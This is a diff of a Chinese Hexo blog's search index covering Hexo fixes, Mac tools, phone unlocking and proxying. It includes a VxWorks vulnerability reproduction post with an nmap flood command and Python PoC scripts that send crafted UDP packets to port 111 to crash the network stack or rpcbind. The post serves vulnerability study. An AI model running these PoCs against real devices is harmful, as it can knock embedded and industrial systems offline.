+<p>可参考：<a href="https://github.com/hexojs/hexo/issues/4450">https://github.com/hexojs/hexo/issues/4450</a></p>
+<h3 id="Q2："><a href="#Q2：" class="headerlink" title="Q2："></a>Q2：</h3><p>浏览器访问出现</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;_layout.swig&#x27; %&#125; &#123;% import &#x27;_macro/post.swig&#x27; as post_template %&#125; &#123;% import &#x27;_macro/sidebar.swig&#x27; as sidebar_template %&#125; &#123;% block title %&#125;&#123;&#123; config.title &#125;&#125;&#123;% if theme.index_with_subtitle and...</span><br></pre></td></tr></table></figure>
+
+<p>如下图所示：</p>
+<p><img src="/posts/253f8523/image-20201129181048024.png" alt="image-20201129181048024"></p>
+<h3 id="A2："><a href="#A2：" class="headerlink" title="A2："></a>A2：</h3><p>是因为Hexo 5将swig渲染插件移除造成</p>
+<p>解决办法，手动安装即可</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
+
+<p>可参考：<a href="https://github.com/ahonn/hexo-theme-even/issues/266">https://github.com/ahonn/hexo-theme-even/issues/266</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面两个问题都是hexo版本更新造成的，如果迁移前后hexo版本一致，就不再需要看上面的解决方案啦。</p>
+<p>遇到问题可以多看看官方文档README.md还有issues，可以更快解决哦！</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>博客迁移</tag>
+        <tag>2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mac OS装机系列小记</title>
+    <url>/posts/51ac3858.html</url>
+    <content><![CDATA[<p>记录下mac os平台好用的软件/工具/操作，方便下次黑苹果环境搭建</p>
+<h3 id="黑苹果安装"><a href="#黑苹果安装" class="headerlink" title="黑苹果安装"></a>黑苹果安装</h3><h4 id="远景论坛"><a href="#远景论坛" class="headerlink" title="远景论坛"></a>远景论坛</h4><p><a href="http://bbs.pcbeta.com/">http://bbs.pcbeta.com/</a></p>
+<h4 id="黑果小兵"><a href="#黑果小兵" class="headerlink" title="黑果小兵"></a>黑果小兵</h4><p><a href="https://blog.daliansky.net/">https://blog.daliansky.net/</a></p>
+<h4 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h4><p><a href="https://github.com/">https://github.com</a></p>
+<p>待续~</p>
+<h3 id="资源推荐"><a href="#资源推荐" class="headerlink" title="资源推荐"></a>资源推荐</h3><h4 id="腾讯柠檬精选"><a href="#腾讯柠檬精选" class="headerlink" title="腾讯柠檬精选"></a>腾讯柠檬精选</h4><p><a href="https://lemon.qq.com/lab/">https://lemon.qq.com/lab/</a></p>
+<p>腾讯出品，收录了一些正版、好用的Mac产品</p>
+<p>质量不错，有点评，并不是全免费</p>
+<h4 id="MacWk"><a href="#MacWk" class="headerlink" title="MacWk"></a>MacWk</h4><p><a href="https://macwk.com/">https://macwk.com/</a></p>
+<p>更新快，有特殊软件，适合学生党</p>
+<p>榜单，专题，专题必备做的都很不错</p>
+<h3 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h3><h4 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h4><p>多版本python环境必备</p>
+<h4 id="proxychain"><a href="#proxychain" class="headerlink" title="proxychain"></a>proxychain</h4><p>终端代理神器，可以配合v2ray</p>
+<h4 id="FinalShell"><a href="#FinalShell" class="headerlink" title="FinalShell"></a>FinalShell</h4><p>管理云服务器好用，支持ssh代理隧道</p>
+<h4 id="ChashX"><a href="#ChashX" class="headerlink" title="ChashX"></a>ChashX</h4><p>V2ray是mac平台目前最好用的代理客户端，没有之一</p>
+<p>支持订阅导入，自动更新；支持PAC模式，规则判断</p>
+<h4 id="HandShaker"><a href="#HandShaker" class="headerlink" title="HandShaker"></a>HandShaker</h4><p>锤子出品的，用来链接安卓手机</p>
+<h4 id="护眼宝"><a href="#护眼宝" class="headerlink" title="护眼宝"></a>护眼宝</h4><p>太真实了，程序猿刚需，个人感觉还是有点用的</p>
+<h4 id="Navicat"><a href="#Navicat" class="headerlink" title="Navicat"></a>Navicat</h4><p>数据库图形化管理神器</p>
+<h4 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h4><p>markdown写作利器，导入导出功能强大，所见即所得</p>
+<h4 id="腾讯柠檬清理"><a href="#腾讯柠檬清理" class="headerlink" title="腾讯柠檬清理"></a>腾讯柠檬清理</h4><p>除了清理释放内存、垃圾，还可以对摄像头、麦克风隐私保护</p>
+<h4 id="TotalFinder"><a href="#TotalFinder" class="headerlink" title="TotalFinder"></a>TotalFinder</h4><p>扩展Finder实现类似windows资源管理器，可多标签窗口</p>
+<h4 id="Downie-4"><a href="#Downie-4" class="headerlink" title="Downie 4"></a>Downie 4</h4><p>图形化界面的视频下载器，可自定义提取，比you-get更容易上手</p>
+<p>未完，待续~</p>
+]]></content>
+      <categories>
+        <category>折腾搞机</category>
+      </categories>
+      <tags>
+        <tag>Mac os</tag>
+        <tag>软件推荐</tag>
+        <tag>黑苹果安装</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Lua开发环境搭建 for mac</title>
     <url>/posts/812b3f7e.html</url>
     <content><![CDATA[<h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><blockquote>
@@ -457,6 +457,23 @@
       </tags>
   </entry>
   <entry>
+    <title>Nubia Z18 fastboot模式下OEM解锁</title>
+    <url>/posts/a9fe26b3.html</url>
+    <content><![CDATA[<p>遇到的问题，如下图所示：<br><img src="/posts/a9fe26b3/93A8E1EBFB0BA55C5ABC63DBAA78309E.png" alt="93A8E1EBFB0BA55C5ABC63DBAA78309E.png"></p>
+<blockquote>
+<p>fastboot oem nubia_unlock NUBIA_NX606J</p>
+</blockquote>
+<p>感谢大佬Froslass</p>
+]]></content>
+      <categories>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>刷机</tag>
+        <tag>fastboot</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Nessus for mac去除IP限制</title>
     <url>/posts/33970cdf.html</url>
     <content><![CDATA[<p>找到安装路径，分别更改两个文件内容</p>
@@ -481,23 +498,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Nubia Z18 fastboot模式下OEM解锁</title>
-    <url>/posts/a9fe26b3.html</url>
-    <content><![CDATA[<p>遇到的问题，如下图所示：<br><img src="/posts/a9fe26b3/93A8E1EBFB0BA55C5ABC63DBAA78309E.png" alt="93A8E1EBFB0BA55C5ABC63DBAA78309E.png"></p>
-<blockquote>
-<p>fastboot oem nubia_unlock NUBIA_NX606J</p>
-</blockquote>
-<p>感谢大佬Froslass</p>
-]]></content>
-      <categories>
-        <category>Android</category>
-      </categories>
-      <tags>
-        <tag>刷机</tag>
-        <tag>fastboot</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PyCharm报错解决llminated Cloud is invalid or has expired</title>
     <url>/posts/5d64ac4c.html</url>
     <content><![CDATA[<p>报错提示如下：</p>
@@ -515,6 +515,42 @@
       </categories>
       <tags>
         <tag>PyCharm报错</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VxWorks漏洞复现</title>
+    <url>/posts/2f09a2a6.html</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>关于VxWorks，这里引用44CON议题</strong><a href="http://www.freebuf.com/vuls/78277.html"><strong>《攻击 VxWorks：从石器时代到星际》</strong></a><strong>探究一文章中的介绍：</strong></p>
+<blockquote>
+<p>VxWorks 是世界上使用最广泛的一种在嵌入式系统中部署的实时操作系统，是由美国WindRiver公司（简称风河公司，即WRS 公司）于1983年设计开发的。其市场范围跨越所有的安全关键领域，仅举几例，包括火星好奇心流浪者、波音787梦幻客机、网络路由器。这些应用程序的安全高危性质使得VxWorks的安全被高度关注。<br>VxWorks操作系统是由美国Wind River(风河公司)开发的一种嵌入式实时操作系统（RTOS），已宣称拥有至少15亿台设备，VxWorks支持几乎所有现代市场上的嵌入式CPU架构，包括x86系列、MIPS、 PowerPC、Freescale ColdFire、Intel i960、SPARC、SH-4、ARM, StrongARM以及xScale CPU。</p>
+</blockquote>
+<h2 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h2><h3 id="网络栈问题"><a href="#网络栈问题" class="headerlink" title="网络栈问题"></a>网络栈问题</h3><h4 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>部分5.x版本的VxWorks系统在短时间内接受到大量的网络数据包，会造成网络栈崩溃，导致VxWorks无法再与外界主机通信。在部分情况下，终端会给出错误信息，报错信息如下图：<br><img src="/posts/2f09a2a6/1589787832884-ed1c0682-d13d-4c12-87b7-3580fc39909a.png" alt="image.png"><br>但是需要注意的是：有的情况下漏洞触发成功而造成DOS攻击后，VxWorks终端并不会输出下面这串字符提示，但是此时VxWorks的网络栈已经崩溃，已无法再与外界通信，这一点可以通过持续ping来验证。如上错误提示一般会在收到的数据包量非常大的情况下才会出现。</p>
+<blockquote>
+<p>interrupt: panic: netJobAdd: ring buffer overflow!</p>
+</blockquote>
+<h4 id="2、验证方式"><a href="#2、验证方式" class="headerlink" title="2、验证方式"></a>2、验证方式</h4><ol>
+<li>执行nmap命令（可能需要执行多次） nmap -sU -p110-166 -r -T5 -n 192.168.102.88 ，其中192.168.102.88为运行VxWorks5.5版本的主机IP。</li>
+</ol>
+<p><img src="/posts/2f09a2a6/1589790127724-3a34350a-5ba3-4938-a242-9d768e4f3901.png" alt="image.png"></p>
+<ol start="2">
+<li>对tcp/21运行的FTP服务连续发送体积极大的FTP请求数据包。</li>
+<li>也可用如下Python代码验证该问题：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">hvcost = <span class="string">&quot;192.168.102.88&quot;</span></span><br><span class="line">UDP_PAYLOAD = <span class="string">&#x27;\x72\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97\x7c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc1</span>(<span class="params">host, rpcPort=<span class="number">111</span>, pktNum=<span class="number">6859</span></span>):</span></span><br><span class="line"> sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(pktNum):</span><br><span class="line"> 	sock.sendto(UDP_PAYLOAD, (hvcost, <span class="number">111</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc2</span>(<span class="params">host, rpcPort=<span class="number">111</span>, portNum=<span class="number">26</span></span>):</span></span><br><span class="line"> sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> <span class="keyword">for</span> port <span class="keyword">in</span> xrange(rpcPort, rpcPort+portNum+<span class="number">1</span>):</span><br><span class="line"> 	sock.sendto(UDP_PAYLOAD, (host, port))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> <span class="keyword">import</span> sys</span><br><span class="line"> poc1(host=sys.argv[<span class="number">0</span>], rpcPort=<span class="number">111</span>, pktNum=<span class="number">100000000</span>)</span><br><span class="line"> <span class="comment">#poc2(host=sys.argv[1], rpcPort=111, portNum=27)</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h3 id="rpcbind服务问题"><a href="#rpcbind服务问题" class="headerlink" title="rpcbind服务问题"></a>rpcbind服务问题</h3><h4 id="1、漏洞描述-1"><a href="#1、漏洞描述-1" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>rpcbind服务是SUN-RPC的一部分，在VxWorks系统中该服务监听在tcp/111及udp/111端口，攻击者向该端口发送经过特殊构造的数据包，可使rpcbind服务崩溃，精心构造的请求可能可以造成任意代码执行，影响5.X和6.X版本。终端会给出错误信息，报错信息如下图：<br><img src="/posts/2f09a2a6/1589790442540-7cbefa09-6d1d-47c6-a0c7-4d08ff5a7df2.png" alt="image.png"></p>
+<h4 id="2、验证方式-1"><a href="#2、验证方式-1" class="headerlink" title="2、验证方式"></a>2、验证方式</h4><p>可用如下Python代码验证该漏洞：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">PAYLOAD_HEX = <span class="string">&#x27;cc6ff7e200000000000000020001a086000000040000000488888888000000110000001100001111111111111111111111111111&#x27;</span></span><br><span class="line"><span class="comment">#hvcost = &quot;192.168.102.88&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">host, rpcPort=<span class="number">111</span></span>):</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.sendto(PAYLOAD_HEX.decode(<span class="string">&#x27;hex&#x27;</span>), (host, rpcPort))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#import sys</span></span><br><span class="line">    poc(host=<span class="string">&quot;192.168.102.88&quot;</span>, rpcPort=<span class="number">111</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="https://www.jianshu.com/p/d156809e0e64">https://www.jianshu.com/p/d156809e0e64</a><br><a href="https://www.freebuf.com/news/93201.html">https://www.freebuf.com/news/93201.html</a></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>工控安全</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+        <tag>VxWorks</tag>
       </tags>
   </entry>
   <entry>
@@ -581,42 +617,6 @@
       </tags>
   </entry>
   <entry>
-    <title>VxWorks漏洞复现</title>
-    <url>/posts/2f09a2a6.html</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>关于VxWorks，这里引用44CON议题</strong><a href="http://www.freebuf.com/vuls/78277.html"><strong>《攻击 VxWorks：从石器时代到星际》</strong></a><strong>探究一文章中的介绍：</strong></p>
-<blockquote>
-<p>VxWorks 是世界上使用最广泛的一种在嵌入式系统中部署的实时操作系统，是由美国WindRiver公司（简称风河公司，即WRS 公司）于1983年设计开发的。其市场范围跨越所有的安全关键领域，仅举几例，包括火星好奇心流浪者、波音787梦幻客机、网络路由器。这些应用程序的安全高危性质使得VxWorks的安全被高度关注。<br>VxWorks操作系统是由美国Wind River(风河公司)开发的一种嵌入式实时操作系统（RTOS），已宣称拥有至少15亿台设备，VxWorks支持几乎所有现代市场上的嵌入式CPU架构，包括x86系列、MIPS、 PowerPC、Freescale ColdFire、Intel i960、SPARC、SH-4、ARM, StrongARM以及xScale CPU。</p>
-</blockquote>
-<h2 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h2><h3 id="网络栈问题"><a href="#网络栈问题" class="headerlink" title="网络栈问题"></a>网络栈问题</h3><h4 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>部分5.x版本的VxWorks系统在短时间内接受到大量的网络数据包，会造成网络栈崩溃，导致VxWorks无法再与外界主机通信。在部分情况下，终端会给出错误信息，报错信息如下图：<br><img src="/posts/2f09a2a6/1589787832884-ed1c0682-d13d-4c12-87b7-3580fc39909a.png" alt="image.png"><br>但是需要注意的是：有的情况下漏洞触发成功而造成DOS攻击后，VxWorks终端并不会输出下面这串字符提示，但是此时VxWorks的网络栈已经崩溃，已无法再与外界通信，这一点可以通过持续ping来验证。如上错误提示一般会在收到的数据包量非常大的情况下才会出现。</p>
-<blockquote>
-<p>interrupt: panic: netJobAdd: ring buffer overflow!</p>
-</blockquote>
-<h4 id="2、验证方式"><a href="#2、验证方式" class="headerlink" title="2、验证方式"></a>2、验证方式</h4><ol>
-<li>执行nmap命令（可能需要执行多次） nmap -sU -p110-166 -r -T5 -n 192.168.102.88 ，其中192.168.102.88为运行VxWorks5.5版本的主机IP。</li>
-</ol>
-<p><img src="/posts/2f09a2a6/1589790127724-3a34350a-5ba3-4938-a242-9d768e4f3901.png" alt="image.png"></p>
-<ol start="2">
-<li>对tcp/21运行的FTP服务连续发送体积极大的FTP请求数据包。</li>
-<li>也可用如下Python代码验证该问题：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">hvcost = <span class="string">&quot;192.168.102.88&quot;</span></span><br><span class="line">UDP_PAYLOAD = <span class="string">&#x27;\x72\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97\x7c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc1</span>(<span class="params">host, rpcPort=<span class="number">111</span>, pktNum=<span class="number">6859</span></span>):</span></span><br><span class="line"> sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(pktNum):</span><br><span class="line"> 	sock.sendto(UDP_PAYLOAD, (hvcost, <span class="number">111</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc2</span>(<span class="params">host, rpcPort=<span class="number">111</span>, portNum=<span class="number">26</span></span>):</span></span><br><span class="line"> sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> <span class="keyword">for</span> port <span class="keyword">in</span> xrange(rpcPort, rpcPort+portNum+<span class="number">1</span>):</span><br><span class="line"> 	sock.sendto(UDP_PAYLOAD, (host, port))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> <span class="keyword">import</span> sys</span><br><span class="line"> poc1(host=sys.argv[<span class="number">0</span>], rpcPort=<span class="number">111</span>, pktNum=<span class="number">100000000</span>)</span><br><span class="line"> <span class="comment">#poc2(host=sys.argv[1], rpcPort=111, portNum=27)</span></span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<h3 id="rpcbind服务问题"><a href="#rpcbind服务问题" class="headerlink" title="rpcbind服务问题"></a>rpcbind服务问题</h3><h4 id="1、漏洞描述-1"><a href="#1、漏洞描述-1" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>rpcbind服务是SUN-RPC的一部分，在VxWorks系统中该服务监听在tcp/111及udp/111端口，攻击者向该端口发送经过特殊构造的数据包，可使rpcbind服务崩溃，精心构造的请求可能可以造成任意代码执行，影响5.X和6.X版本。终端会给出错误信息，报错信息如下图：<br><img src="/posts/2f09a2a6/1589790442540-7cbefa09-6d1d-47c6-a0c7-4d08ff5a7df2.png" alt="image.png"></p>
-<h4 id="2、验证方式-1"><a href="#2、验证方式-1" class="headerlink" title="2、验证方式"></a>2、验证方式</h4><p>可用如下Python代码验证该漏洞：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">PAYLOAD_HEX = <span class="string">&#x27;cc6ff7e200000000000000020001a086000000040000000488888888000000110000001100001111111111111111111111111111&#x27;</span></span><br><span class="line"><span class="comment">#hvcost = &quot;192.168.102.88&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">host, rpcPort=<span class="number">111</span></span>):</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.sendto(PAYLOAD_HEX.decode(<span class="string">&#x27;hex&#x27;</span>), (host, rpcPort))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#import sys</span></span><br><span class="line">    poc(host=<span class="string">&quot;192.168.102.88&quot;</span>, rpcPort=<span class="number">111</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="https://www.jianshu.com/p/d156809e0e64">https://www.jianshu.com/p/d156809e0e64</a><br><a href="https://www.freebuf.com/news/93201.html">https://www.freebuf.com/news/93201.html</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>工控安全</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-        <tag>VxWorks</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>docker-compose build加速构建</title>
     <url>/posts/a4848fd3.html</url>
     <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>
@@ -635,8 +635,8 @@
 <blockquote>
 <p>sed: -e expression #1, char 37: unknown option to `s’</p>
 </blockquote>
-<p>❌s@<a href="mailto:&#100;&#101;&#98;&#x2e;&#100;&#101;&#x62;&#105;&#x61;&#x6e;&#x2e;&#111;&#x72;&#x67;&#64;&#x6d;&#x69;&#x72;&#114;&#111;&#114;&#x73;&#x2e;&#x61;&#108;&#105;&#x79;&#117;&#x6e;&#46;&#99;&#111;&#109;">&#100;&#101;&#98;&#x2e;&#100;&#101;&#x62;&#105;&#x61;&#x6e;&#x2e;&#111;&#x72;&#x67;&#64;&#x6d;&#x69;&#x72;&#114;&#111;&#114;&#x73;&#x2e;&#x61;&#108;&#105;&#x79;&#117;&#x6e;&#46;&#99;&#111;&#109;</a>/debian/g</p>
-<p>✅s@<a href="mailto:&#100;&#x65;&#98;&#x2e;&#100;&#x65;&#98;&#x69;&#x61;&#x6e;&#x2e;&#111;&#114;&#x67;&#x40;&#109;&#x69;&#114;&#114;&#111;&#114;&#115;&#46;&#97;&#108;&#x69;&#121;&#117;&#110;&#x2e;&#x63;&#x6f;&#x6d;">&#100;&#x65;&#98;&#x2e;&#100;&#x65;&#98;&#x69;&#x61;&#x6e;&#x2e;&#111;&#114;&#x67;&#x40;&#109;&#x69;&#114;&#114;&#111;&#114;&#115;&#46;&#97;&#108;&#x69;&#121;&#117;&#110;&#x2e;&#x63;&#x6f;&#x6d;</a>@g</p>
+<p>❌s@<a href="mailto:&#x64;&#101;&#x62;&#x2e;&#100;&#101;&#98;&#x69;&#97;&#110;&#46;&#111;&#114;&#103;&#x40;&#109;&#x69;&#114;&#x72;&#x6f;&#x72;&#x73;&#x2e;&#x61;&#108;&#x69;&#121;&#117;&#110;&#x2e;&#x63;&#x6f;&#109;">&#x64;&#101;&#x62;&#x2e;&#100;&#101;&#98;&#x69;&#97;&#110;&#46;&#111;&#114;&#103;&#x40;&#109;&#x69;&#114;&#x72;&#x6f;&#x72;&#x73;&#x2e;&#x61;&#108;&#x69;&#121;&#117;&#110;&#x2e;&#x63;&#x6f;&#109;</a>/debian/g</p>
+<p>✅s@<a href="mailto:&#x64;&#x65;&#x62;&#46;&#100;&#x65;&#x62;&#x69;&#x61;&#x6e;&#46;&#111;&#114;&#103;&#x40;&#x6d;&#105;&#114;&#x72;&#x6f;&#x72;&#x73;&#x2e;&#97;&#108;&#105;&#x79;&#x75;&#110;&#x2e;&#99;&#x6f;&#x6d;">&#x64;&#x65;&#x62;&#46;&#100;&#x65;&#x62;&#x69;&#x61;&#x6e;&#46;&#111;&#114;&#103;&#x40;&#x6d;&#105;&#114;&#x72;&#x6f;&#x72;&#x73;&#x2e;&#97;&#108;&#105;&#x79;&#x75;&#110;&#x2e;&#99;&#x6f;&#x6d;</a>@g</p>
 ]]></content>
       <categories>
         <category>Tools</category>
@@ -692,27 +692,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>hexo文章加密测试</title>
-    <url>/posts/864aa7e5.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">Hey, password is required here.</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="75e1fc9509dd58630166609cf756d06a7e51c8cd909b37e3c494d3e6e5e79691">75e4ccd2b0055ae2243444400d7136b92f1705bbd5a99d4c3a3cc6da0994ca5fd224724c4ef0318b496fbe645d5b27cee10b63d24509edd6830355b58016813b</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>加密</tag>
-        <tag>测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>frp实现内网穿透(通过设置http代理/Socks代理)</title>
     <url>/posts/f7240e5b.html</url>
     <content><![CDATA[<h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>1.需要通过公网服务器代理连接内网机器</p>
@@ -749,6 +728,27 @@
         <tag>内网穿透</tag>
         <tag>http代理</tag>
         <tag>socks5代理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo文章加密测试</title>
+    <url>/posts/864aa7e5.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">Hey, password is required here.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="75e1fc9509dd58630166609cf756d06a7e51c8cd909b37e3c494d3e6e5e79691">75e4ccd2b0055ae2243444400d7136b92f1705bbd5a99d4c3a3cc6da0994ca5fd224724c4ef0318b496fbe645d5b27cee10b63d24509edd6830355b58016813b</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>加密</tag>
+        <tag>测试</tag>
       </tags>
   </entry>
   <entry>
@@ -963,23 +963,28 @@
       </tags>
   </entry>
   <entry>
-    <title>内网渗透常用CMD命令总结</title>
-    <url>/posts/c2f7796a.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">Hey, password is required here.</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="1e6ae85d26a7b1ba0846f4d281802c21a7083e57866c498311095856c488768b">6ee5c19fccb06a6ea3cf3d35c8ba75962695edc8ce5b780ba41055a63a5655af35e31ffbb57bea3046a8f7287d10e9db2139fa746917875d9fe75b9176ab646282621b136c4efe9024f56b69498cd79939b4ca2cd24174893bbff208a2fed06940bbc84db8ef18ac6c75b8114eb11b22ab599a93cc6bef358bfc1a36a10308abafe36eaebfb82246bcfc2a17c8dc618f07f32cde730d6624c9ea72d819855fa0244dfa92afc5fbe06e3ee6025d3f1c792bfdb859ba9c0595578a9e41884ad15f43bebce80734b1db7dcefe1966876fab2154ec8a9b94482fe3c563c83b3aab017da2f4fcd2c6dcbf2930d4c1a8ad0be6a3e56997417c3487d675ad7e75be70d199f20bc800fc14b7f1a6631e7ada7e13128fa6d46c0d80fdbc2a8562686ef3df30e2ba1cf3babe82ea2f6948d70300d57cb1af971f62ec7314363f299270ea65ba2f52e7f8e010adcd79d1575418f2b702534fed9e1608b59bca935e7b1911a9ced6a9b4d342a250b597557206e7105d9b265b65f2c4cdf28c1995a4d3e2fe9e53165278ff1124c832b75ce856a706b13ff589aa9de3121d05aa68de4bf550edfba687a9173e86a7e94ff417c2458dd078e899f3e52b0901163327db8e9ee4059a21d7ccbacb91f254cf7d9a2a8803d5cf0c5fb237f118993511921f1fbcf48c41eb6d7a45ceadbb61a5374b7659b3ef92256addf30e577821e2e6251b6b8c1fda40f363ae91ffca3c16be9ccd69916c35755bf2e5081d423c3c94e9e9a4e3288ffdd08ce7378fcee6128a064a2970eaeed2e5972710201753ed504fc20810f024cc94d0a57962c879d333910efd61d6d59e57854ea95644fa91e96c5ca4f643c76f3f6bd868daad445c54e9222334948cd3ba8ddb66d5e3ec1ba633c08e876adc61a883cf5064552a1bd9c2188ca58f50c79ef9123d0e8f0130edaa18ef6bf975c15b00a849c1f03a4cd0fd929f8b0deec949d143dc5bc45ab98b442ddbdc942b9b9e53a09370e12e15f6af0f514326f201e0d8002165c4126dc9d22dae126c74ffc7b9da175da5f31b6b7a8ee44550bbb917136e95c42cdf9f6e5444084771da265ee337054474c3fb447020e3c96de196e78350ec9ce497dda8bf8aa24134112769566316ea499215ff28845b1de2e6431d41ee9778bfaf3fe278ce9f25de44e1b47dccca53b3a745b6c856dcc3335bdeab72077c2c32f30dcd2b41fdbc800007e663d5f20beac80c72b58f322628bb64b26fc5226eb4b984b41b93ec472e56b32852dbc3715330f778fdf7a4f99cbbe64643ad0d2ead51926606f0d51ce66b5fc1c0d7c95eeb20fbecbbdd83d4b744f6a3301c0c94f7bd028e59cbd0404a2db7b50c4da9